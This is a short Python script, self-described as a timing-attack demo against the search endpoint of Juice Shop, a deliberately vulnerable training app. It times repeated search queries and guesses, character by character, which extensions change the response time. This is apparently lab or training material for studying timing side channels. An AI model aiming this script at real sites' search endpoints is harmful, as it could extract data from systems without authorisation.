import requests
import statistics
import argparse


def searchProduct(q,n,host,runtime):
    time = lambda res : float(res.headers['X-Runtime']) if runtime else res.elapsed.total_seconds()
    times = [ time(requests.get('http://'+host+'/rest/products/search?q='+q)) for i in range(n) ]
    return statistics.median(times)

chars = list("abcdefghijklmnopqrtsuvwxyz0123456789_") # underscore is a single char wildcard

def findNextChar(q,search,doRight):
    for c in chars:
        qq = q + c if doRight else c + q
        i = search(qq)
        print(q + c,i)

parser = argparse.ArgumentParser(description='Simple timing attack demo on the juice-shop search page')
parser.add_argument('QUERY',type=str) 
parser.add_argument('-n', nargs='?', default=10, type=int,help='Number of runs per request') 
parser.add_argument('-t', nargs='?', default='runtime', type=str, choices=['runtime', 'system'], help='Request time measuring technique') 
parser.add_argument('--nextchar', type=str, choices=['before', 'after'],help='Find next character before or after QUERY') 
parser.add_argument('--host', type=str,default="localhost:3000",help='Host url') 

args = parser.parse_args()
print(args)

n = args.n
h = args.host
search = lambda q : searchProduct(q,n,h,args.t == "runtime")
q = args.QUERY
if args.nextchar:
    findNextChar(q,search,args.nextchar == 'after')
else:
    res = requests.get('http://'+h+'/rest/products/search?q='+q)
    print(res)
    print(res.text)
    n = search(q)
    print(q,n)
